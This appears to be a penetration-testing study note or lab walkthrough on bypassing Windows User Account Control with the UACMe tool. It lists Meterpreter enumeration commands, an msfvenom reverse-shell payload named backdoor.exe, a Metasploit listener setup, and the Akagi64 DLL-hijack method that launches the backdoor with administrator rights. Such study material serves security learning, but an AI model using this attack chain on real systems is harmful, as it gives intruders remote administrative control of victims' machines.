# Privilege Escalation: Bypassing UAC
> Bypassing UAC With UACMe

## Contents
- [Intro](#intro)
  - [User Account Control (UAC)](#user-account-control-uac)
  - [The Problem: UAC Pop-Up](#the-problem-uac-pop-up)
  - [Bypassing UAC](#bypassing-uac)
  - [Tool: UACMe](#tool-uacme)
- [Practical: UACMe](#practical-uacme)
  - [Scenario](#scenario)
  - [UACMe - Explanation](#uacme---explanation)
  - [MSFVenom Payload](#msfvenom-payload)
  - [Set up a Listener](#set-up-a-listener)
  - [Meterpreter: On the Target](#meterpreter-on-the-target)
  - [Bypass UAC & Execute Backdoor](#bypass-uac--execute-backdoor)

## Intro

### User Account Control (UAC)
- UAC is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.
- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt (admiun password), whereas a privileged user will be prompted with a consent prompt (image below).
- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

### The Problem: UAC Pop-Up
- The problem you run into is when you're running a remote shell or a meterpreter session on a target machine, and you try to run a program with elevated privileges.
- A dialog box will pop up on the target system system, but b/c you are on the command line, you won't see and won't have any way to acknowledge it.
- Therefore you need a way to bypass that.

### Bypassing UAC
- In order to successfully bypass UAC we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
- UAC has various integrity levels ranging from low to high. If the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting for user confirmation.
- There are multiple tools and techniques that can be used to bypass UAC, however the tool and technique used will depend on the version of Windows running on the target system.

### Tool: [UACMe](https://github.com/hfiref0x/UACME)
> Bypassing UAC With UACMe. Look over the README.md documentation.
- UACMe is an open-source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques.
- The UACMe GitHub repo contains a very well documented list of methods that can be used to bypass UAC on muiltiple versions of Windows ranging from Windows 7 to Window 11.
- It allows attackers to execute malicious payloads on a Windows target with admin/elevated privileges by abusing the inbuilt Windows AutoElevate tool.
- The UACMe GitHub repo has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.
- NOTE: When selecting a Key, you need to find one that shows "unfixed" in the version of Windows your target machine is running.

## Practical: UACMe

### Scenario
- Unprivileged meterpreter session from system exploit via MSF.
- You get a shell on the system, you enumerate, and try to change the administrator password:
```
sysinfo
# This gives you O/S info (very important)
# Meterpreter: x86/windows (32-bit)

pgrep explorer
# This searches for the explorer process number
# Note the number (process ID for the explorer.exe process)

migrate [pgrep number]
# This should give you a 64-bit meterpreter session

sysinfo
# Meterpreter: x64/windows; good to go

getuid
#You are logged on as "admin" (NOT "administrator"--different). Need priv esc.

getprivs
# Shows you the privileges assigned to the current user
# Indicates an "unprivileged" (non-administrator) account

shell
# Opens a shell session with the current user's creds
```
- In the shell:
```
> net user
  # Shows two accounts: admin and administrator (plus Guest)

> net localgroup administrators
  # Shows admin is part of the administrators group
  # This means that this user can execute with administrator privileges (BUT via UAC)

> net user admin password123
  # Just an example: try to set a new password for the admin account
  # Returns: "System error 5 has occurred. Access is denied."
  # That's UAC blocking the elevated priv. command
```

### UACMe - Explanation 

#### [Description](https://github.com/hfiref0x/UACME#uacme)
- Defeating Windows User Account Control by abusing built-in Windows AutoElevate backdoor.

#### [Requirements](https://github.com/hfiref0x/UACME#system-requirements)
- x86-32/x64 Windows 7/8/8.1/10/11 (client, some methods however works on server version too).
- Admin account (account/user in the Administrators Group) with UAC set on default settings required.

#### [Usage](https://github.com/hfiref0x/UACME#usage)
- 32-Bit: `akagi32 [Key] [Param]`
- `64-Bit: akagi64 [Key] [Param]`
- The **_Key_** value can be obtained from the "Keys (click to expand/collapse)" just below the usage header.
- The **_Param_** value is an optional command (executable file name including full path) to run.
  - This second parameter can be empty
  - In this case the program will execute elevated cmd.exe from system32 folder.
- We are going to be using Key 23 (works best in this scenario).
  - `23. Author: Leo Davidson derivative`
  - Type: Dll Hijack
  - Method: IFileOperation
  - Target(s): \system32\pkgmgr.exe
  - Component(s): DismCore.dll
  - Implementation: ucmDismMethod
  - Works from: Windows 7 (7600)
  - Fixed in: unfixed
  - Code status: added in v2.5.1
- Run examples:
```
akagi32.exe 23
akagi64.exe 61
akagi32 23 c:\windows\system32\calc.exe
akagi64 61 c:\windows\system32\charmap.exe
```

**Note:** In real life you'll need to clone the repo and compile your own binaries ([see instructions](https://github.com/hfiref0x/UACME/tree/master#build) on the GitHub).

### MSFVenom Payload
- You need to create a payload with MSFVenom and then transfer that to the target system.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f exe > backdoor.exe
```

### Set up a Listener
- You can use the MetaSploit handler:
```
> use multihandler
> set payload windows/meterpreter/reverse_tcp
> set LHOST [local ip]
> set LPORT 1234
> run
```

### Meterpreter: On the Target
- Go back into your meterpreter session and upload the UACMe binary and your backdoor.exe file.
```
> cd C:\\
> mkdir Temp
> cd Temp
> upload backdoor.exe
> upload tools/UACME/Akagi64.exe
> dir                             # should see both of those files
```

#### Problem
- If you tried to execute backdoor.exe to get your reverse shell, you could not because UAC would block it (confirmation pop-up).
- You need to BYPASS UAC FIRST, and that's what Akagi64.exe (with key 23) is for...

### Bypass UAC & Execute Backdoor
- Get a shell on the target via your meterpreter session
```
> .\Akagi64.exe 23 C:\\Temp\backdoor.exe
```
- This should bypass UAC and give you the reverse shell on your listener (with administrator privs).
